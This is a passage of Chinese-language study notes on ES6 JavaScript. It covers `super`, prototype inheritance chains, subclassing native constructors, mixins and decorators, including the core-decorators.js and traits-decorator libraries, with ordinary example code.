上面代码中，super.x赋值为3，这时等同于对this.x赋值为3。而当读取super.x的时候，读的是A.prototype.x，所以返回undefined。\r\n\t\t- 如果super作为对象，用在静态方法之中，这时super将指向父类，而不是父类的原型对象。\r\n\t\t- class Parent {\r\n  static myMethod(msg) {\r\n    console.log('static', msg);\r\n  }\r\n\r\n  myMethod(msg) {\r\n    console.log('instance', msg);\r\n  }\r\n}\r\n\r\nclass Child extends Parent {\r\n  static myMethod(msg) {\r\n    super.myMethod(msg);\r\n  }\r\n\r\n  myMethod(msg) {\r\n    super.myMethod(msg);\r\n  }\r\n}\r\n\r\nChild.myMethod(1); // static 1\r\n\r\nvar child = new Child();\r\nchild.myMethod(2); // instance 2\r\n\t\t- 上面代码中，super在静态方法之中指向父类，在普通方法之中指向父类的原型对象。\r\n\t\t- 另外，在子类的静态方法中通过super调用父类的方法时，方法内部的this指向当前的子类，而不是子类的实例。\r\n\t\t- class A {\r\n  constructor() {\r\n    this.x = 1;\r\n  }\r\n  static print() {\r\n    console.log(this.x);\r\n  }\r\n}\r\n\r\nclass B extends A {\r\n  constructor() {\r\n    super();\r\n    this.x = 2;\r\n  }\r\n  static m() {\r\n    super.print();\r\n  }\r\n}\r\n\r\nB.x = 3;\r\nB.m() // 3\r\n\t\t- 上面代码中，静态方法B.m里面，super.print指向父类的静态方法。这个方法里面的this指向的是B，而不是B的实例。\r\n\t\t- 注意，使用super的时候，必须显式指定是作为函数、还是作为对象使用，否则会报错。\r\n\t\t- class A {}\r\n\r\nclass B extends A {\r\n  constructor() {\r\n    super();\r\n    console.log(super); // 报错\r\n  }\r\n}\r\n\t\t- 上面代码中，console.log(super)当中的super，无法看出是作为函数使用，还是作为对象使用，所以 JavaScript 引擎解析代码的时候就会报错。这时，如果能清晰地表明super的数据类型，就不会报错。\r\n\t\t- class A {}\r\n\r\nclass B extends A {\r\n  constructor() {\r\n    super();\r\n    console.log(super.valueOf() instanceof B); // true\r\n  }\r\n}\r\n\r\nlet b = new B();\r\n\t\t- 上面代码中，super.valueOf()表明super是一个对象，因此就不会报错。同时，由于super使得this指向B的实例，所以super.valueOf()返回的是一个B的实例。\r\n\t\t- 最后，由于对象总是继承其他对象的，所以可以在任意一个对象中，使用super关键字。\r\n\t\t- var obj = {\r\n  toString() {\r\n    return \"MyObject: \" + super.toString();\r\n  }\r\n};\r\n\r\nobj.toString(); // MyObject: [object Object]\r\n\r\n### 类的 prototype 属性和__proto__属性\r\n\r\n- 大多数浏览器的 ES5 实现之中，每一个对象都有__proto__属性，指向对应的构造函数的prototype属性。Class 作为构造函数的语法糖，同时有prototype属性和__proto__属性，因此同时存在两条继承链。\r\n\r\n\t- （1）子类的__proto__属性，表示构造函数的继承，总是指向父类。\r\n\t- （2）子类prototype属性的__proto__属性，表示方法的继承，总是指向父类的prototype属性。\r\n\r\n\t\t- class A {\r\n}\r\n\r\nclass B extends A {\r\n}\r\n\r\nB.__proto__ === A // true\r\nB.prototype.__proto__ === A.prototype // true\r\n\t\t- 上面代码中，子类B的__proto__属性指向父类A，子类B的prototype属性的__proto__属性指向父类A的prototype属性。\r\n这样的结果是因为，类的继承是按照下面的模式实现的。\r\n\t\t- class A {\r\n}\r\n\r\nclass B {\r\n}\r\n\r\n// B 的实例继承 A 的实例\r\nObject.setPrototypeOf(B.prototype, A.prototype);\r\n\r\n// B 继承 A 的静态属性\r\nObject.setPrototypeOf(B, A);\r\n\r\nconst b = new B();\r\n\t\t- 《对象的扩展》一章给出过Object.setPrototypeOf方法的实现。\r\n\t\t- Object.setPrototypeOf = function (obj, proto) {\r\n  obj.__proto__ = proto;\r\n  return obj;\r\n}\r\n\t\t- 因此，就得到了上面的结果。\r\n\t\t- Object.setPrototypeOf(B.prototype, A.prototype);\r\n// 等同于\r\nB.prototype.__proto__ = A.prototype;\r\n\r\nObject.setPrototypeOf(B, A);\r\n// 等同于\r\nB.__proto__ = A;\r\n\t\t- 这两条继承链，可以这样理解：作为一个对象，子类（B）的原型（__proto__属性）是父类（A）；作为一个构造函数，子类（B）的原型对象（prototype属性）是父类的原型对象（prototype属性）的实例。\r\n\t\t- Object.create(A.prototype);\r\n// 等同于\r\nB.prototype.__proto__ = A.prototype;\r\n\t\t- extends关键字后面可以跟多种类型的值。\r\n\r\n\t\t\t- class B extends A {\r\n}\r\n\t\t\t- 上面代码的A，只要是一个有prototype属性的函数，就能被B继承。由于函数都有prototype属性（除了Function.prototype函数），因此A可以是任意函数。\r\n\r\n\t\t- 下面，讨论两种情况。第一种，子类继承Object类。\r\n\r\n\t\t\t- class A extends Object {\r\n}\r\n\r\nA.__proto__ === Object // true\r\nA.prototype.__proto__ === Object.prototype // true\r\n\t\t\t- 这种情况下，A其实就是构造函数Object的复制，A的实例就是Object的实例。\r\n\r\n\t\t- 第二种情况，不存在任何继承。\r\n\r\n\t\t\t- class A {\r\n}\r\n\r\nA.__proto__ === Function.prototype // true\r\nA.prototype.__proto__ === Object.prototype // true\r\n\t\t\t- 这种情况下，A作为一个基类（即不存在任何继承），就是一个普通函数，所以直接继承Function.prototype。但是，A调用后返回一个空对象（即Object实例），所以A.prototype.__proto__指向构造函数（Object）的prototype属性。\r\n\r\n\t\t- 实例的 __proto__ 属性 \r\n\r\n\t\t\t- 子类实例的__proto__属性的__proto__属性，指向父类实例的__proto__属性。也就是说，子类的原型的原型，是父类的原型。\r\n\r\n\t\t\t\t- var p1 = new Point(2, 3);\r\nvar p2 = new ColorPoint(2, 3, 'red');\r\n\r\np2.__proto__ === p1.__proto__ // false\r\np2.__proto__.__proto__ === p1.__proto__ // true\r\n\t\t\t\t- 上面代码中，ColorPoint继承了Point，导致前者原型的原型是后者的原型。\r\n\r\n因此，通过子类实例的__proto__.__proto__属性，可以修改父类实例的行为。\r\n\t\t\t\t- p2.__proto__.__proto__.printName = function () {\r\n  console.log('Ha');\r\n};\r\n\r\np1.printName() // \"Ha\"\r\n\t\t\t\t- 上面代码在ColorPoint的实例p2上向Point类添加方法，结果影响到了Point的实例p1。\r\n\r\n### 原生构造函数的继承\r\n\r\n- 原生构造函数是指语言内置的构造函数，通常用来生成数据结构。ECMAScript 的原生构造函数大致有下面这些。\r\n\r\n\t- Boolean()\r\nNumber()\r\nString()\r\nArray()\r\nDate()\r\nFunction()\r\nRegExp()\r\nError()\r\nObject()\r\n\t- 以前，这些原生构造函数是无法继承的，比如，不能自己定义一个Array的子类。\r\n\t- function MyArray() {\r\n  Array.apply(this, arguments);\r\n}\r\n\r\nMyArray.prototype = Object.create(Array.prototype, {\r\n  constructor: {\r\n    value: MyArray,\r\n    writable: true,\r\n    configurable: true,\r\n    enumerable: true\r\n  }\r\n});\r\n\t- 上面代码定义了一个继承 Array 的MyArray类。但是，这个类的行为与Array完全不一致。\r\n\t- var colors = new MyArray();\r\ncolors[0] = \"red\";\r\ncolors.length  // 0\r\n\r\ncolors.length = 0;\r\ncolors[0]  // \"red\"\r\n\t- 之所以会发生这种情况，是因为子类无法获得原生构造函数的内部属性，通过Array.apply()或者分配给原型对象都不行。原生构造函数会忽略apply方法传入的this，也就是说，原生构造函数的this无法绑定，导致拿不到内部属性。\r\n\t- ES5 是先新建子类的实例对象this，再将父类的属性添加到子类上，由于父类的内部属性无法获取，导致无法继承原生的构造函数。比如，Array构造函数有一个内部属性[[DefineOwnProperty]]，用来定义新属性时，更新length属性，这个内部属性无法在子类获取，导致子类的length属性行为不正常。\r\n\t- 下面的例子中，我们想让一个普通对象继承Error对象。\r\n\t- var e = {};\r\n\r\nObject.getOwnPropertyNames(Error.call(e))\r\n// [ 'stack' ]\r\n\r\nObject.getOwnPropertyNames(e)\r\n// []\r\n\t- 上面代码中，我们想通过Error.call(e)这种写法，让普通对象e具有Error对象的实例属性。但是，Error.call()完全忽略传入的第一个参数，而是返回一个新对象，e本身没有任何变化。这证明了Error.call(e)这种写法，无法继承原生构造函数。\r\n\r\n- ES6 允许继承原生构造函数定义子类，因为 ES6 是先新建父类的实例对象this，然后再用子类的构造函数修饰this，使得父类的所有行为都可以继承。下面是一个继承Array的例子。\r\n\r\n\t- class MyArray extends Array {\r\n  constructor(...args) {\r\n    super(...args);\r\n  }\r\n}\r\n\r\nvar arr = new MyArray();\r\narr[0] = 12;\r\narr.length // 1\r\n\r\narr.length = 0;\r\narr[0] // undefined\r\n\t- 上面代码定义了一个MyArray类，继承了Array构造函数，因此就可以从MyArray生成数组的实例。这意味着，ES6 可以自定义原生数据结构（比如Array、String等）的子类，这是 ES5 无法做到的。\r\n\r\n上面这个例子也说明，extends关键字不仅可以用来继承类，还可以用来继承原生的构造函数。因此可以在原生数据结构的基础上，定义自己的数据结构。下面就是定义了一个带版本功能的数组。\r\n\t- class VersionedArray extends Array {\r\n  constructor() {\r\n    super();\r\n    this.history = [[]];\r\n  }\r\n  commit() {\r\n    this.history.push(this.slice());\r\n  }\r\n  revert() {\r\n    this.splice(0, this.length, ...this.history[this.history.length - 1]);\r\n  }\r\n}\r\n\r\nvar x = new VersionedArray();\r\n\r\nx.push(1);\r\nx.push(2);\r\nx // [1, 2]\r\nx.history // [[]]\r\n\r\nx.commit();\r\nx.history // [[], [1, 2]]\r\n\r\nx.push(3);\r\nx // [1, 2, 3]\r\nx.history // [[], [1, 2]]\r\n\r\nx.revert();\r\nx // [1, 2]\r\n\t- 上面代码中，VersionedArray会通过commit方法，将自己的当前状态生成一个版本快照，存入history属性。revert方法用来将数组重置为最新一次保存的版本。除此之外，VersionedArray依然是一个普通数组，所有原生的数组方法都可以在它上面调用。\r\n\t- 下面是一个自定义Error子类的例子，可以用来定制报错时的行为。\r\n\r\n\t\t- class ExtendableError extends Error {\r\n  constructor(message) {\r\n    super();\r\n    this.message = message;\r\n    this.stack = (new Error()).stack;\r\n    this.name = this.constructor.name;\r\n  }\r\n}\r\n\r\nclass MyError extends ExtendableError {\r\n  constructor(m) {\r\n    super(m);\r\n  }\r\n}\r\n\r\nvar myerror = new MyError('ll');\r\nmyerror.message // \"ll\"\r\nmyerror instanceof Error // true\r\nmyerror.name // \"MyError\"\r\nmyerror.stack\r\n// Error\r\n//     at MyError.ExtendableError\r\n//     ...\r\n\t\t- 注意，继承Object的子类，有一个行为差异。\r\n\t\t- class NewObj extends Object{\r\n  constructor(){\r\n    super(...arguments);\r\n  }\r\n}\r\nvar o = new NewObj({attr: true});\r\no.attr === true  // false\r\n\t\t- 上面代码中，NewObj继承了Object，但是无法通过super方法向父类Object传参。这是因为 ES6 改变了Object构造函数的行为，一旦发现Object方法不是通过new Object()这种形式调用，ES6 规定Object构造函数会忽略参数。\r\n\r\n### Mixin 模式的实现\r\n\r\n- Mixin 指的是多个对象合成一个新的对象，新对象具有各个组成成员的接口。它的最简单实现如下。\r\n\r\n\t- const a = {\r\n  a: 'a'\r\n};\r\nconst b = {\r\n  b: 'b'\r\n};\r\nconst c = {...a, ...b}; // {a: 'a', b: 'b'}\r\n\t- 上面代码中，c对象是a对象和b对象的合成，具有两者的接口。\r\n\t- 下面是一个更完备的实现，将多个类的接口“混入”（mix in）另一个类。\r\n\r\n\t\t- function mix(...mixins) {\r\n  class Mix {}\r\n\r\n  for (let mixin of mixins) {\r\n    copyProperties(Mix.prototype, mixin); // 拷贝实例属性\r\n    copyProperties(Mix.prototype, Reflect.getPrototypeOf(mixin)); // 拷贝原型属性\r\n  }\r\n\r\n  return Mix;\r\n}\r\n\r\nfunction copyProperties(target, source) {\r\n  for (let key of Reflect.ownKeys(source)) {\r\n    if ( key !== \"constructor\"\r\n      && key !== \"prototype\"\r\n      && key !== \"name\"\r\n    ) {\r\n      let desc = Object.getOwnPropertyDescriptor(source, key);\r\n      Object.defineProperty(target, key, desc);\r\n    }\r\n  }\r\n}\r\n\t\t- 上面代码的mix函数，可以将多个对象合成为一个类。使用的时候，只要继承这个类即可。\r\n\t\t- class DistributedEdit extends mix(Loggable, Serializable) {\r\n  // ...\r\n}\r\n\r\n## 修饰器\r\n\r\n### 类的修饰\r\n\r\n- 许多面向对象的语言都有修饰器（Decorator）函数，用来修改类的行为。目前，有一个提案将这项功能，引入了 ECMAScript。\r\n\r\n\t- @testable\r\nclass MyTestableClass {\r\n  // ...\r\n}\r\n\r\nfunction testable(target) {\r\n  target.isTestable = true;\r\n}\r\n\r\nMyTestableClass.isTestable // true\r\n\t- 上面代码中，@testable就是一个修饰器。它修改了MyTestableClass这个类的行为，为它加上了静态属性isTestable。testable函数的参数target是MyTestableClass类本身。\r\n\r\n- 基本上，修饰器的行为就是下面这样。\r\n\r\n\t- @decorator\r\nclass A {}\r\n\r\n// 等同于\r\n\r\nclass A {}\r\nA = decorator(A) || A;\r\n\t- 也就是说，修饰器是一个对类进行处理的函数。修饰器函数的第一个参数，就是所要修饰的目标类。\r\n\t- function testable(target) {\r\n  // ...\r\n}\r\n\t- 上面代码中，testable函数的参数target，就是会被修饰的类。\r\n\t- 如果觉得一个参数不够用，可以在修饰器外面再封装一层函数。\r\n\t- function testable(isTestable) {\r\n  return function(target) {\r\n    target.isTestable = isTestable;\r\n  }\r\n}\r\n\r\n@testable(true)\r\nclass MyTestableClass {}\r\nMyTestableClass.isTestable // true\r\n\r\n@testable(false)\r\nclass MyClass {}\r\nMyClass.isTestable // false\r\n\r\n\t\t- 上面代码中，修饰器testable可以接受参数，这就等于可以修改修饰器的行为。\r\n\r\n- 注意，修饰器对类的行为的改变，是代码编译时发生的，而不是在运行时。这意味着，修饰器能在编译阶段运行代码。也就是说，修饰器本质就是编译时执行的函数。\r\n- 前面的例子是为类添加一个静态属性，如果想添加实例属性，可以通过目标类的prototype对象操作。\r\n\r\n\t- function testable(target) {\r\n  target.prototype.isTestable = true;\r\n}\r\n\r\n@testable\r\nclass MyTestableClass {}\r\n\r\nlet obj = new MyTestableClass();\r\nobj.isTestable // true\r\n\t- // mixins.js\r\nexport function mixins(...list) {\r\n  return function (target) {\r\n    Object.assign(target.prototype, ...list)\r\n  }\r\n}\r\n\r\n// main.js\r\nimport { mixins } from './mixins'\r\n\r\nconst Foo = {\r\n  foo() { console.log('foo') }\r\n};\r\n\r\n@mixins(Foo)\r\nclass MyClass {}\r\n\r\nlet obj = new MyClass();\r\nobj.foo() // 'foo'\r\n\t- 上面代码中，修饰器函数testable是在目标类的prototype对象上添加属性，因此就可以在实例上调用。\r\n\r\n- 下面是另外一个例子。\r\n\r\n\t- 上面代码通过修饰器mixins，把Foo对象的方法添加到了MyClass的实例上面。可以用Object.assign()模拟这个功能。\r\n\t- const Foo = {\r\n  foo() { console.log('foo') }\r\n};\r\n\r\nclass MyClass {}\r\n\r\nObject.assign(MyClass.prototype, Foo);\r\n\r\nlet obj = new MyClass();\r\nobj.foo() // 'foo'\r\n\t- 实际开发中，React 与 Redux 库结合使用时，常常需要写成下面这样。\r\n\t- class MyReactComponent extends React.Component {}\r\n\r\nexport default connect(mapStateToProps, mapDispatchToProps)(MyReactComponent);\r\n\t- 有了装饰器，就可以改写上面的代码。\r\n\t- @connect(mapStateToProps, mapDispatchToProps)\r\nexport default class MyReactComponent extends React.Component {}\r\n\r\n### 方法的修饰\r\n\r\n- 修饰器不仅可以修饰类，还可以修饰类的属性。\r\n\r\n\t- class Person {\r\n  @readonly\r\n  name() { return `${this.first} ${this.last}` }\r\n}\r\n\t- 上面代码中，修饰器readonly用来修饰“类”的name方法。\r\n\r\n修饰器函数readonly一共可以接受三个参数。\r\n\t- function readonly(target, name, descriptor){\r\n  // descriptor对象原来的值如下\r\n  // {\r\n  //   value: specifiedFunction,\r\n  //   enumerable: false,\r\n  //   configurable: true,\r\n  //   writable: true\r\n  // };\r\n  descriptor.writable = false;\r\n  return descriptor;\r\n}\r\n\r\nreadonly(Person.prototype, 'name', descriptor);\r\n// 类似于\r\nObject.defineProperty(Person.prototype, 'name', descriptor);\r\n\t- 修饰器第一个参数是类的原型对象，上例是Person.prototype，修饰器的本意是要“修饰”类的实例，但是这个时候实例还没生成，所以只能去修饰原型（这不同于类的修饰，那种情况时target参数指的是类本身）；第二个参数是所要修饰的属性名，第三个参数是该属性的描述对象。\r\n\t- 另外，上面代码说明，修饰器（readonly）会修改属性的描述对象（descriptor），然后被修改的描述对象再用来定义属性。\r\n\t- 下面是另一个例子，修改属性描述对象的enumerable属性，使得该属性不可遍历。\r\n\t- class Person {\r\n  @nonenumerable\r\n  get kidCount() { return this.children.length; }\r\n}\r\n\r\nfunction nonenumerable(target, name, descriptor) {\r\n  descriptor.enumerable = false;\r\n  return descriptor;\r\n}\r\n\t- 下面的@log修饰器，可以起到输出日志的作用。\r\n\t- class Math {\r\n  @log\r\n  add(a, b) {\r\n    return a + b;\r\n  }\r\n}\r\n\r\nfunction log(target, name, descriptor) {\r\n  var oldValue = descriptor.value;\r\n\r\n  descriptor.value = function() {\r\n    console.log(`Calling ${name} with`, arguments);\r\n    return oldValue.apply(this, arguments);\r\n  };\r\n\r\n  return descriptor;\r\n}\r\n\r\nconst math = new Math();\r\n\r\n// passed parameters should get logged now\r\nmath.add(2, 4);\r\n\r\n- 修饰器有注释的作用。\r\n\r\n\t- @testable\r\nclass Person {\r\n  @readonly\r\n  @nonenumerable\r\n  name() { return `${this.first} ${this.last}` }\r\n}\r\n\t- 从上面代码中，我们一眼就能看出，Person类是可测试的，而name方法是只读和不可枚举的。\r\n\t- 下面是使用 Decorator 写法的组件，看上去一目了然。\r\n\t- @Component({\r\n  tag: 'my-component',\r\n  styleUrl: 'my-component.scss'\r\n})\r\nexport class MyComponent {\r\n  @Prop() first: string;\r\n  @Prop() last: string;\r\n  @State() isVisible: boolean = true;\r\n\r\n  render() {\r\n    return (\r\n      <p>Hello, my name is {this.first} {this.last}</p>\r\n    );\r\n  }\r\n}\r\n\t- 如果同一个方法有多个修饰器，会像剥洋葱一样，先从外到内进入，然后由内向外执行。\r\n\t- function dec(id){\r\n  console.log('evaluated', id);\r\n  return (target, property, descriptor) => console.log('executed', id);\r\n}\r\n\r\nclass Example {\r\n    @dec(1)\r\n    @dec(2)\r\n    method(){}\r\n}\r\n// evaluated 1\r\n// evaluated 2\r\n// executed 2\r\n// executed 1\r\n\t- 上面代码中，外层修饰器@dec(1)先进入，但是内层修饰器@dec(2)先执行。\r\n\t- 除了注释，修饰器还能用来类型检查。所以，对于类来说，这项功能相当有用。从长期来看，它将是 JavaScript 代码静态分析的重要工具。\r\n\r\n### 为什么修饰器不能用于函数\r\n\r\n- 修饰器只能用于类和类的方法，不能用于函数，因为存在函数提升。\r\n- var counter = 0;\r\n\r\nvar add = function () {\r\n  counter++;\r\n};\r\n\r\n@add\r\nfunction foo() {\r\n}\r\n- 上面的代码，意图是执行后counter等于 1，但是实际上结果是counter等于 0。因为函数提升，使得实际执行的代码是下面这样。\r\n- @add\r\nfunction foo() {\r\n}\r\n\r\nvar counter;\r\nvar add;\r\n\r\ncounter = 0;\r\n\r\nadd = function () {\r\n  counter++;\r\n};\r\n- 下面是另一个例子。\r\n- var readOnly = require(\"some-decorator\");\r\n\r\n@readOnly\r\nfunction foo() {\r\n}\r\n- 上面代码也有问题，因为实际执行是下面这样。\r\n- var readOnly;\r\n\r\n@readOnly\r\nfunction foo() {\r\n}\r\n\r\nreadOnly = require(\"some-decorator\");\r\n- 总之，由于存在函数提升，使得修饰器不能用于函数。类是不会提升的，所以就没有这方面的问题。\r\n\r\n另一方面，如果一定要修饰函数，可以采用高阶函数的形式直接执行。\r\n- function doSomething(name) {\r\n  console.log('Hello, ' + name);\r\n}\r\n\r\nfunction loggingDecorator(wrapped) {\r\n  return function() {\r\n    console.log('Starting');\r\n    const result = wrapped.apply(this, arguments);\r\n    console.log('Finished');\r\n    return result;\r\n  }\r\n}\r\n\r\nconst wrapped = loggingDecorator(doSomething);\r\n\r\n### core-decorators.js\r\n\r\n- core-decorators.js是一个第三方模块，提供了几个常见的修饰器，通过它可以更好地理解修饰器。\r\n\r\n\t- （1）@autobind\r\n\r\n\t\t- autobind修饰器使得方法中的this对象，绑定原始对象。\r\n\r\n\t\t\t- import { autobind } from 'core-decorators';\r\n\r\nclass Person {\r\n  @autobind\r\n  getPerson() {\r\n    return this;\r\n  }\r\n}\r\n\r\nlet person = new Person();\r\nlet getPerson = person.getPerson;\r\n\r\ngetPerson() === person;\r\n// true\r\n\r\n\t- （2）@readonly\r\n\r\n\t\t- readonly修饰器使得属性或方法不可写。\r\n\r\n\t\t\t- import { readonly } from 'core-decorators';\r\n\r\nclass Meal {\r\n  @readonly\r\n  entree = 'steak';\r\n}\r\n\r\nvar dinner = new Meal();\r\ndinner.entree = 'salmon';\r\n// Cannot assign to read only property 'entree' of [object Object]\r\n\r\n\t- （3）@override\r\n\r\n\t\t- override修饰器检查子类的方法，是否正确覆盖了父类的同名方法，如果不正确会报错。\r\n\r\n\t\t\t- import { override } from 'core-decorators';\r\n\r\nclass Parent {\r\n  speak(first, second) {}\r\n}\r\n\r\nclass Child extends Parent {\r\n  @override\r\n  speak() {}\r\n  // SyntaxError: Child#speak() does not properly override Parent#speak(first, second)\r\n}\r\n\r\n// or\r\n\r\nclass Child extends Parent {\r\n  @override\r\n  speaks() {}\r\n  // SyntaxError: No descriptor matching Child#speaks() was found on the prototype chain.\r\n  //\r\n  //   Did you mean \"speak\"?\r\n}\r\n\r\n\t- （4）@deprecate (别名@deprecated)\r\n\r\n\t\t- deprecate或deprecated修饰器在控制台显示一条警告，表示该方法将废除。\r\n\r\n\t\t\t- import { deprecate } from 'core-decorators';\r\n\r\nclass Person {\r\n  @deprecate\r\n  facepalm() {}\r\n\r\n  @deprecate('We stopped facepalming')\r\n  facepalmHard() {}\r\n\r\n  @deprecate('We stopped facepalming', { url: 'http://knowyourmeme.com/memes/facepalm' })\r\n  facepalmHarder() {}\r\n}\r\n\r\nlet person = new Person();\r\n\r\nperson.facepalm();\r\n// DEPRECATION Person#facepalm: This function will be removed in future versions.\r\n\r\nperson.facepalmHard();\r\n// DEPRECATION Person#facepalmHard: We stopped facepalming\r\n\r\nperson.facepalmHarder();\r\n// DEPRECATION Person#facepalmHarder: We stopped facepalming\r\n//\r\n//     See http://knowyourmeme.com/memes/facepalm for more details.\r\n//\r\n\r\n\t- （5）@suppressWarnings\r\n\r\n\t\t- suppressWarnings修饰器抑制deprecated修饰器导致的console.warn()调用。但是，异步代码发出的调用除外。\r\n\r\n\t\t\t- import { suppressWarnings } from 'core-decorators';\r\n\r\nclass Person {\r\n  @deprecated\r\n  facepalm() {}\r\n\r\n  @suppressWarnings\r\n  facepalmWithoutWarning() {\r\n    this.facepalm();\r\n  }\r\n}\r\n\r\nlet person = new Person();\r\n\r\nperson.facepalmWithoutWarning();\r\n// no warning is logged\r\n\r\n### 使用修饰器实现自动发布事件\r\n\r\n- 我们可以使用修饰器，使得对象的方法被调用时，自动发出一个事件。\r\n\r\n\t- const postal = require(\"postal/lib/postal.lodash\");\r\n\r\nexport default function publish(topic, channel) {\r\n  const channelName = channel || '/';\r\n  const msgChannel = postal.channel(channelName);\r\n  msgChannel.subscribe(topic, v => {\r\n    console.log('频道: ', channelName);\r\n    console.log('事件: ', topic);\r\n    console.log('数据: ', v);\r\n  });\r\n\r\n  return function(target, name, descriptor) {\r\n    const fn = descriptor.value;\r\n\r\n    descriptor.value = function() {\r\n      let value = fn.apply(this, arguments);\r\n      msgChannel.publish(topic, value);\r\n    };\r\n  };\r\n}\r\n\t- 上面代码定义了一个名为publish的修饰器，它通过改写descriptor.value，使得原方法被调用时，会自动发出一个事件。它使用的事件“发布/订阅”库是Postal.js。\r\n\t- 它的用法如下。\r\n\t- // index.js\r\nimport publish from './publish';\r\n\r\nclass FooComponent {\r\n  @publish('foo.some.message', 'component')\r\n  someMethod() {\r\n    return { my: 'data' };\r\n  }\r\n  @publish('foo.some.other')\r\n  anotherMethod() {\r\n    // ...\r\n  }\r\n}\r\n\r\nlet foo = new FooComponent();\r\n\r\nfoo.someMethod();\r\nfoo.anotherMethod();\r\n\t- 以后，只要调用someMethod或者anotherMethod，就会自动发出一个事件。\r\n\t- $ bash-node index.js\r\n频道:  component\r\n事件:  foo.some.message\r\n数据:  { my: 'data' }\r\n\r\n频道:  /\r\n事件:  foo.some.other\r\n数据:  undefined\r\n\r\n### Mixin \r\n\r\n- 在修饰器的基础上，可以实现Mixin模式。所谓Mixin模式，就是对象继承的一种替代方案，中文译为“混入”（mix in），意为在一个对象之中混入另外一个对象的方法。\r\n\r\n\t- 请看下面的例子。\r\n\r\n\t\t- const Foo = {\r\n  foo() { console.log('foo') }\r\n};\r\n\r\nclass MyClass {}\r\n\r\nObject.assign(MyClass.prototype, Foo);\r\n\r\nlet obj = new MyClass();\r\nobj.foo() // 'foo'\r\n\t\t- 上面代码之中，对象Foo有一个foo方法，通过Object.assign方法，可以将foo方法“混入”MyClass类，导致MyClass的实例obj对象都具有foo方法。这就是“混入”模式的一个简单实现。\r\n\r\n\t- 下面，我们部署一个通用脚本mixins.js，将 Mixin 写成一个修饰器。\r\n\r\n\t\t- export function mixins(...list) {\r\n  return function (target) {\r\n    Object.assign(target.prototype, ...list);\r\n  };\r\n}\r\n\t\t- 然后，就可以使用上面这个修饰器，为类“混入”各种方法。\r\n\t\t- import { mixins } from './mixins';\r\n\r\nconst Foo = {\r\n  foo() { console.log('foo') }\r\n};\r\n\r\n@mixins(Foo)\r\nclass MyClass {}\r\n\r\nlet obj = new MyClass();\r\nobj.foo() // \"foo\"\r\n\t\t- 通过mixins这个修饰器，实现了在MyClass类上面“混入”Foo对象的foo方法。\r\n\t\t- 不过，上面的方法会改写MyClass类的prototype对象，如果不喜欢这一点，也可以通过类的继承实现 Mixin。\r\n\t\t- class MyClass extends MyBaseClass {\r\n  /* ... */\r\n}\r\n\t\t- 上面代码中，MyClass继承了MyBaseClass。如果我们想在MyClass里面“混入”一个foo方法，一个办法是在MyClass和MyBaseClass之间插入一个混入类，这个类具有foo方法，并且继承了MyBaseClass的所有方法，然后MyClass再继承这个类。\r\n\t\t- let MyMixin = (superclass) => class extends superclass {\r\n  foo() {\r\n    console.log('foo from MyMixin');\r\n  }\r\n};\r\n\t\t- 上面代码中，MyMixin是一个混入类生成器，接受superclass作为参数，然后返回一个继承superclass的子类，该子类包含一个foo方法。\r\n\t\t- 接着，目标类再去继承这个混入类，就达到了“混入”foo方法的目的。\r\n\t\t- class MyClass extends MyMixin(MyBaseClass) {\r\n  /* ... */\r\n}\r\n\r\nlet c = new MyClass();\r\nc.foo(); // \"foo from MyMixin\"\r\n\t\t- 如果需要“混入”多个方法，就生成多个混入类。\r\n\t\t- class MyClass extends Mixin1(Mixin2(MyBaseClass)) {\r\n  /* ... */\r\n}\r\n\t\t- 这种写法的一个好处，是可以调用super，因此可以避免在“混入”过程中覆盖父类的同名方法\r\n\r\n\t\t\t- let Mixin1 = (superclass) => class extends superclass {\r\n  foo() {\r\n    console.log('foo from Mixin1');\r\n    if (super.foo) super.foo();\r\n  }\r\n};\r\n\r\nlet Mixin2 = (superclass) => class extends superclass {\r\n  foo() {\r\n    console.log('foo from Mixin2');\r\n    if (super.foo) super.foo();\r\n  }\r\n};\r\n\r\nclass S {\r\n  foo() {\r\n    console.log('foo from S');\r\n  }\r\n}\r\n\r\nclass C extends Mixin1(Mixin2(S)) {\r\n  foo() {\r\n    console.log('foo from C');\r\n    super.foo();\r\n  }\r\n}\r\n\t\t\t- 上面代码中，每一次混入发生时，都调用了父类的super.foo方法，导致父类的同名方法没有被覆盖，行为被保留了下来。\r\n\t\t\t- new C().foo()\r\n// foo from C\r\n// foo from Mixin1\r\n// foo from Mixin2\r\n// foo from S\r\n\r\n### Trait\r\n\r\n- Trait 也是一种修饰器，效果与 Mixin 类似，但是提供更多功能，比如防止同名方法的冲突、排除混入某些方法、为混入的方法起别名等等。\r\n\r\n下面采用traits-decorator这个第三方模块作为例子。这个模块提供的traits修饰器，不仅可以接受对象，还可以接受 ES6 类作为参数。\r\n\r\n\t- import { traits } from 'traits-decorator';\r\n\r\nclass TFoo {\r\n  foo() { console.log('foo') }\r\n}\r\n\r\nconst TBar = {\r\n  bar() { console.log('bar') }\r\n};\r\n\r\n@traits(TFoo, TBar)\r\nclass MyClass { }\r\n\r\nlet obj = new MyClass();\r\nobj.foo() // foo\r\nobj.bar() // bar\r\n\t- 上面代码中，通过traits修饰器，在MyClass类上面“混入”了TFoo类的foo方法和TBar对象的bar方法。\r\n\r\n- Trait 不允许“混入”同名方法。\r\n\r\n\t- import { traits } from 'traits-decorator';\r\n\r\nclass TFoo {\r\n  foo() { console.log('foo') }\r\n}\r\n\r\nconst TBar = {\r\n  bar() { console.log('bar') },\r\n  foo() { console.log('foo') }\r\n};\r\n\r\n@traits(TFoo, TBar)\r\nclass MyClass { }\r\n// 报错\r\n// throw new Error('Method named: ' + methodName + ' is defined twice.');\r\n//        ^\r\n// Error: Method named: foo is defined twice.\r\n\t- 上面代码中，TFoo和TBar都有foo方法，结果traits修饰器报错。\r\n\t- 一种解决方法是排除TBar的foo方法。\r\n\t- import { traits, excludes } from 'traits-decorator';\r\n\r\nclass TFoo {\r\n  foo() { console.log('foo') }\r\n}\r\n\r\nconst TBar = {\r\n  bar() { console.log('bar') },\r\n  foo() { console.log('foo') }\r\n};\r\n\r\n@traits(TFoo, TBar::excludes('foo'))\r\nclass MyClass { }\r\n\r\nlet obj = new MyClass();\r\nobj.foo() // foo\r\nobj.bar() // bar\r\n\t- 上面代码使用绑定运算符（::）在TBar上排除foo方法，混入时就不会报错了。\r\n\t- 另一种方法是为TBar的foo方法起一个别名。\r\n\t- import { traits, alias } from 'traits-decorator';\r\n\r\nclass TFoo {\r\n  foo() { console.log('foo') }\r\n}\r\n\r\nconst TBar = {\r\n  bar() { console.log('bar') },\r\n  foo() { console.log('foo') }\r\n};\r\n\r\n@traits(TFoo, TBar::alias({foo: 